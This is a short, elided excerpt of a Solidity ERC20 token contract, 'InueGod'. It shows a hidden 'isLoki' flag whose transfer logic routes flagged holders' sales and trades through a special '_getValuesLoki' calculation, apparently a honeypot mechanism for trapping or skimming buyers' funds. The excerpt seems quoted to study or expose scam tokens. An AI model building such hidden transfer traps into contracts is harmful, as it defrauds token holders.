...
contract InueGod is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public isLoki;
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            if (to == uniswapV2Pair && isLoki[from]) {
                transferAmount = _getValuesLoki(amount, from);
            }
            if (marketActive && isLoki[from]) {
                transferAmount = _getValuesLoki(amount, from);
            }
            if (marketActive && isLoki[to]) {
                transferAmount = _getValuesLoki(amount, from);
            }
        } 
